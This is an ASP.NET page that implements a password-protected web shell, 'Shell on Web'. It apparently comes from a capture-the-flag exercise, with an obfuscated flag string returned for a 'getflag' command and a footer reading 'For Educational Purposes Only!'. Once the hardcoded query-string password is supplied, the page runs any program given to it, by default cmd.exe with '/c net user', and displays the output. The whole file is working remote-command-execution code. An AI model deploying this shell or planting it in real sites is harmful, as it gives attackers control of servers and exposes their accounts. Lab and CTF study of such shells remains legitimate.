<%@ import Namespace="system.IO" %>
<%@ import Namespace="System.Diagnostics" %>
<script runat="server">
   sub execCmd(Src As Object, E As EventArgs)
	 dim res as string = "the flag is "
	 dim rest as string
	 dim resur as string
	 dim resbak as string
	 dim res1 as string
     if secretcommand.text = "getflag" then
		rest = "BR"
		res1 = "X-F"
		resur =  "3R_"
		rest = rest + "0WS"
		res1 = res1 + "orc"
		resbak = "0R_"
		resur = resur + "BAC"
		res1 = res1 + "e"
		resur = resur + "KD0"
		res = res + rest + resur + resbak + res1
	 else
		 dim thisproc As New Process()
		 dim thiscmd As New ProcessStartInfo(cmdpath.text)
		 thiscmd.UseShellExecute = false
		 thiscmd.RedirectStandardOutput = true
		 thisproc.StartInfo = thiscmd
		 thiscmd.Arguments=command.text
		 thisproc.Start()
		 dim sr As StreamReader = thisproc.StandardOutput
		 res = sr.Readtoend()
		 thisproc.Close()
	 end if
     res = replace(res,"<","&lt;")
     res = replace(res,">","&gt;")
     output.text = vbcrlf & "<pre>" & res & "</pre>"
   End Sub
</script>
<html>
   <body>
	  <% if Request.QueryString("password") ="turtle" then %>
		  <form runat="server">
			 <p>Shell on Web</p>
			 <p>
				<asp:Label id="label1" runat="server">Command Line</asp:Label>
				<asp:TextBox id="cmdpath" runat="server" width="500px">c:\windows\system32\cmd.exe</asp:TextBox>
			 <p>
				<asp:Label id="label2" runat="server">Arguments</asp:Label>
				<asp:TextBox id="command" runat="server" width="1000px" text="/c net user">/c net user</asp:TextBox>
			 <p>
			 <p>
				<asp:Label id="label3" runat="server">Secret Command</asp:Label>
				<asp:TextBox id="secretcommand" runat="server" width="500px"></asp:TextBox>
			 <p>
				<asp:Button id="Button" onclick="execCmd" runat="server" text="Go"></asp:Button>
			 <p>
			 <p>
				<asp:Label id="output" runat="server"></asp:Label>
			 <p>For Educational Purposes Only!</p>
			 <p>-- XFTI --</p>
		  </form>
	  <% else %>
		  <form runat="server">
		  <p>Try guessing the password and visit me as http://[webshellserver]/ninja.aspx?password=[thepassword]
		  </form>
	  <% end if %>
   </body>
</html>